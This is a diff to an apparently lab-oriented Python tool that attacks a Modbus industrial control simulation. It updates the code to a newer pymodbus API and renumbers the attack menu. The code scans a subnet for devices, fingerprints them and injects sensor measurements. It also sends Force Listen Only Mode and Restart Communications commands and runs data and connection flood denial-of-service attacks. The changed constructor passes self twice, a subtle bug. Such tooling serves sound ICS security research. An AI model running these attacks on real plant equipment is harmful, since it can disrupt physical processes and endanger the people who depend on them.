@@ -5,14 +5,19 @@
 #           that no ICS-specific attacks are generated here. You must implement custom cyber attacks
 #           yourself if desired.
 
+import struct
 import nmap
 import random
 import numpy as np
 import time
 from threading import Thread, Event
-from pymodbus.client.sync import ModbusTcpClient, ModbusSerialClient
-from pymodbus.mei_message import ReadDeviceInformationRequest
-from pymodbus.pdu import ModbusRequest, ExceptionResponse
+from pymodbus.client import ModbusTcpClient
+from pymodbus.pdu import ModbusPDU, ExceptionResponse
+from pymodbus.pdu.mei_message import ReadDeviceInformationRequest
+from pymodbus.pdu.diag_message import ForceListenOnlyModeRequest, RestartCommunicationsOptionRequest
+
+import pymodbus
+print(pymodbus.__version__)
 
 # constants
 LOGO = r"""
@@ -31,16 +36,16 @@ LOGO = r"""
 # CLASS:    CustomModbusRequest
 # PURPOSE:  A subclass of the ModbusRequest class. Used to construct
 #           custom modbus requests.
-class CustomModbusRequest(ModbusRequest):
-    def __init__(self, custom_data=b'', **kwargs):
-        ModbusRequest.__init__(self, **kwargs)
-        self.custom_data = custom_data
+class CustomModbusRequest(ModbusPDU):
+    def __init__(self, payload=b'', **kwargs):
+        super().__init__(self, **kwargs)
+        self.payload = payload
 
     def encode(self):
-        return self.custom_data
+        return self.payload
     
     def decode(self, data):
-        self.custom_data = data
+        self.payload = data
 
 
 
@@ -151,7 +156,7 @@ def device_identification_attack(ip_addresses):
         print(f"===== Performing device identification on {ip} =====")
         client = ModbusTcpClient(host=ip, port=502)
         request = ReadDeviceInformationRequest(read_code=1)
-        response = client.execute(request=request)
+        response = client.execute(request=request, no_response_expected=False)
 
         # check if device identification is possible
         if response == None:
@@ -160,19 +165,19 @@ def device_identification_attack(ip_addresses):
             # extract data from all object types
             print("*** Basic object type data: ***")
             request = ReadDeviceInformationRequest(read_code=1)
-            response = client.execute(request=request)
+            response = client.execute(request=request, no_response_expected=False)
             for k, v in response.information.items():
                 print(f"  {k}: {v}")
 
             print("*** Regular object type data: ***")
             request = ReadDeviceInformationRequest(read_code=2)
-            response = client.execute(request=request)
+            response = client.execute(request=request, no_response_expected=False)
             for k, v in response.information.items():
                 print(f"  {k}: {v}")
 
             print("*** Extended object type data: ***")
             request = ReadDeviceInformationRequest(read_code=3)
-            response = client.execute(request=request)
+            response = client.execute(request=request, no_response_expected=False)
             for k, v in response.information.items():
                 print(f"  {k}: {v}")
         print()
@@ -324,20 +329,18 @@ def force_listen_mode(ip_addresses):
         print(f"Forcing device {ip} into Force Listen Only Mode")
         client = ModbusTcpClient(host=ip, port=502)
 
-        # send custom pdu request for a Force Listen Only Mode request) - function code 08 with subfunction code 04
-        CustomFunctionCode = create_custom_request(8)
-        request = CustomFunctionCode(custom_data=b'\x00\x04\x00\x00')
-
-        try:
-            response = client.execute(request)
-            if isinstance(response, ExceptionResponse):
-                # check if an illegal function exception (0x01) has occurred
-                if response.exception_code != 1:
-                    print(f"Function code 08 accepted with exception {response.exception_code}")
-            else:
-                print(f"Function Code 08 accepted")
-        except Exception as e:
-            print(f"Function Code 08 accepted with an error")
+        # send custom pdu request for a Force Listen Only Mode request)
+        # function code 08 with subfunction code 04 (already set)
+        request = ForceListenOnlyModeRequest()
+        print(request)
+        response = client.execute(request=request, no_response_expected=False)
+        if not response.isError():
+            print("Force listen command was accepted (device may not actually be affected)")
+            print(response)
+        else:
+            print("Force listen command was rejected.")
+        time.sleep(1)
+        client.close()
 
     print("### FORCE LISTEN MODE FINISH ###")
 
@@ -351,25 +354,20 @@ def restart_communication(ip_addresses):
     print("### RESTART COMMUNICATION ###")
 
     for ip in ip_addresses:
-        print(f"Sending a restart communication request to {ip} in 3 second intervales for 30 seconds")
+        print(f"Sending a restart communication request to {ip} in 3 second intervals for 30 seconds")
 
         client = ModbusTcpClient(host=ip, port=502)
         for _ in range(10):
 
-            # send custom pdu request for a Restart Communcation - function code 08 with subfunction code 01 (device - dependent)
-            CustomFunctionCode = create_custom_request(8)
-            request = CustomFunctionCode(custom_data=b'\x00\x01\x00\x00')
-
-            try:
-                response = client.execute(request)
-                if isinstance(response, ExceptionResponse):
-                    # check if an illegal function exception (0x01) has occurred
-                    if response.exception_code != 1:
-                        print(f"Function code 08 accepted with exception {response.exception_code}")
-                else:
-                    print(f"Function Code 08 accepted")
-            except Exception as e:
-                print(f"Function Code 08 accepted with an error")
+            # send custom pdu request for a Restart Communcation - function code 08 
+            # with subfunction code 01 (device - dependent)
+            request = RestartCommunicationsOptionRequest()
+            response = client.execute(request=request, no_response_expected=False)
+            if not response.isError():
+                print("Restart communication command was accepted (device may not actually be affected)")
+                print(response)
+            else:
+                print("Restart communication command was rejected.")
             time.sleep(3)
         client.close()
             
@@ -449,29 +447,29 @@ def connection_flood_attack(ip_addresses):
 # Main function
 if __name__ == "__main__":
     print(LOGO)
-    
+
     menuPrompt = """
 -----------------------------------------------------------------
 | Please select an attack to run against the ICS simulation:    |
 |                                                               |
 |    Reconnaissance Attacks                                     |
-|    (0) - address scan                                         |
-|    (1) - function code scan                                   |
-|    (2) - device identification attack                         |
+|    (1) - address scan                                         |
+|    (2) - function code scan                                   |
+|    (3) - device identification attack                         |
 |                                                               |
 |    Response and Measurement Injection Attacks                 |
-|    (3) - naive sensor read                                    |
-|    (4) - sporadic sensor measurement injection                |
+|    (4) - naive sensor read                                    |
+|    (5) - sporadic sensor measurement injection                |
 |                                                               |
 |    Command Injection Attacks                                  |
-|    (5) - force listen mode                                    |
-|    (6) - restart communication                                |
+|    (6) - force listen mode                                    |
+|    (7) - restart communication                                |
 |                                                               |
 |    Denial of Service Attacks                                  |
-|    (7) - data flood attack                                    |
-|    (8) - connection flood attack                              |
+|    (8) - data flood attack                                    |
+|    (9) - connection flood attack                              |
 |                                                               |
-|    (9) - quit                                                 |
+|    (0) - quit                                                 |
 -----------------------------------------------------------------
 
 """
@@ -479,7 +477,7 @@ if __name__ == "__main__":
     selection = -1
     scanned_ips = []
     scanned_addresses = {}
-    while selection != 9:
+    while selection != 0:
         selection = -1
         # get user input (only as int)
         try:
@@ -493,15 +491,15 @@ if __name__ == "__main__":
             print("Warning: No IPs scanned. Run an address scan to find Modbus clients")
 
         # perform cyber attack
-        if selection == 0:
+        if selection == 1:
             scanned_ips = address_scan("192.168.0.0/24")
-        elif selection == 1:
-            function_code_scan(scanned_ips)
         elif selection == 2:
-            device_identification_attack(scanned_ips)
+            function_code_scan(scanned_ips)
         elif selection == 3:
-            scanned_addresses = naive_sensor_read(scanned_ips)
+            device_identification_attack(scanned_ips)
         elif selection == 4:
+            scanned_addresses = naive_sensor_read(scanned_ips)
+        elif selection == 5:
             sporadic_sensor_measurement_injection(scanned_ips, scanned_addresses=scanned_addresses)
         #elif selection == 5:
         #    calculated_sensor_measure_injection(scanned_ips)
@@ -511,11 +509,11 @@ if __name__ == "__main__":
         #    altered_actuator_state(scanned_ips)
         #elif selection == 8:
         #    altered_control_set_points(scanned_ips)
-        elif selection == 5:
-            force_listen_mode(scanned_ips)
         elif selection == 6:
-            restart_communication(scanned_ips)
+            force_listen_mode(scanned_ips)
         elif selection == 7:
-            data_flood_attack(scanned_ips)
+            restart_communication(scanned_ips)
         elif selection == 8:
+            data_flood_attack(scanned_ips)
+        elif selection == 9:
             connection_flood_attack(scanned_ips)
